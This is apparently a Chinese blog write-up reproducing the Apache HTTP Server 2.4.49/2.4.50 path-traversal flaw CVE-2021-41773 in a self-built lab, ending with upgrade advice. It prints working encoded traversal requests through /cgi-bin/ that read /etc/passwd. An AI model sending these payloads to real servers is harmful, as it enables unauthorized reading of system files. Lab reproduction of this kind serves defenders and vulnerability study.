#  CVE-2021-41773 漏洞复现：从失败到成功的探索  
原创 ralap  网络个人修炼   2025-06-24 01:00  
  
近期在安全设备上发现多起利用 CVE-2021-41773 漏洞的攻击事件，借此机会记录对该漏洞的分析及复现过程，分享从失败尝试到成功复现的探索心得。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13RVS1DQFguRxQcKOojljbwyrUOtOicib9PzvbnpKsBHb8icChxvHHhXw1w/640?wx_fmt=png&from=appmsg "")  
  
  
一、漏洞原理  
  
CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中发现的一个严重路径遍历和命令注入漏洞。当服务器启用 CGI 脚本处理时，攻击者可通过构造特殊格式的 URL，利用编码绕过机制读取服务器任意文件，甚至执行系统命令。  
  
漏洞的核心在于 Apache 对 URL 中编码的路径遍历序列（如`%2e%2e`表示`..`）处理不当，导致在解析 CGI 请求时绕过了正常的目录访问限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13GLjRgwqHiczQibiboJMmMfAQKbkxficIzHh6UUl4I704RicHmvaMkvMicyicQ/640?wx_fmt=png&from=appmsg "")  
  
  
二、编译安装 Apache 2.4.49  
  
1. 环境准备  
  
由于系统默认通过 yum 安装的 Apache 版本为 2.4.6，无法复现漏洞，因此需手动编译安装 2.4.49 版本。首先，确保系统已安装编译所需依赖：  
```
yum install -y gcc make pcre-devel zlib-devel openssl-devel
```  
  
2. 下载源码并编译安装  
  
执行以下命令下载 Apache 2.4.49 源码包并进行编译安装：  
```
wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz
tar -zxvf httpd-2.4.49.tar.gz
cd httpd-2.4.49
./configure --prefix=/usr/local/httpd
make && make install
```  
  
  
三、配置 Apache 服务器  
  
编辑配置文件 /usr/local/httpd/conf/httpd.conf，将第 207 行的：  
```
Requireall denied
```  
  
修改为：  
```
Requireall granted
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13dqeXDQUjXIPXib0Sda17EkxeuzqEb5caw65mOaib8siaiabias2riaKoicibKw/640?wx_fmt=png&from=appmsg "")  
  
此修改允许所有来源访问，方便后续漏洞复现测试。保存配置后，启动 Apache 服务：  
```
/usr/local/httpd/bin/apachec
```  
  
启动成功后，可通过浏览器访问服务器 IP，确认 Apache 默认欢迎页面正常显示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13oKcicO9fULqq3VBfjichvSBEzEnzGS4Wd3edRic1miaE3WydxZD9pGrLuA/640?wx_fmt=png&from=appmsg "")  
  
  
四、复现漏洞  
  
1. 初始尝试（失败）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfLQ3c8ynRDO17dGqrOInyNNb7J1fflCsABC5JQI3dCYyJ9Qg6Y0PV0ggj6Czfyvw3hMj32pmtublA/640?wx_fmt=png&from=appmsg "")  
  
使用 BurpSuite 按POC发送以下请求：  
```
GET /.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13cOyN2p7XLxnzsVJgZUDryQ2zMfVLMUYEmsYA3durAYxhhzbiaHCWfBw/640?wx_fmt=png&from=appmsg "")  
  
以及其他变体请求：  
```
GET /.%2e/./%2e%2e/../%2e%2e/../%2e%2e/../etc/passwd HTTP/1.1
GET /.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
GET /./.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```  
  
均未成功获取目标文件内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13dzfQt4tRurCgr1fdl2KIrpcPYOQcV4oYqajAEPs9vcibLOmd3pJvicNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13pIWNqdyCY7t9tQSEEbUpclxHcwYH5YTEQ9U0k4PlpOQ6wOmUHFEicjw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13ianAaSvIiaHphmPqSicYCpGsbpficOGmu5QwY6SLBAHUZE8tlPpiajHTuNA/640?wx_fmt=png&from=appmsg "")  
  
2. 关键突破（成功）  
  
经过多次尝试，发现当请求路径包含 /cgi-bin/ 时，漏洞得以成功复现。发送以下请求：  
```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13icwzCTZVmpCUgMdHaO0Bh42AEicXzw1dffo27gNShRP0VGK0xtTKicAQw/640?wx_fmt=png&from=appmsg "")  
  
同样，Apache 2.4.50 版本也存在类似漏洞，通过变体请求：  
```
GET /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd HTTP/1.1
```  
  
也可以成功读取目标文件内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13pA9GRhgYKT1ibxAIRI4mS3OBcQmsQ2LSMSTsgUuWqEr5tDKup4JvKzA/640?wx_fmt=png&from=appmsg "")  
  
  
  
五、漏洞修复建议  
  
针对 CVE-2021-41773 漏洞，最直接且有效的修复方式是将 Apache HTTP Server 升级至官方最新版本，目前最新版本为 2.4.63。升级后，该漏洞已被彻底修补。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5y2fUaoQPfKmRv5UNzUfQdkQhzPjOj13JAXclyZTvnbcx4YvP7bWJMfunrrmn2rKGQQCassQqRnuH1srPtxCJw/640?wx_fmt=png&from=appmsg "")  
  
  
  
参考链接  
  
https://httpd.apache.org/security/vulnerabilities_24.html  
  
https://www.secrss.com/articles/34890  
  
https://www.jianshu.com/p/3076d9ec68cf  
  
https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md  
  
  
  
-End-  
  
  
  
**如果觉得我的分享有用**  
  
**[点赞+分享****+关注]**  
  
  
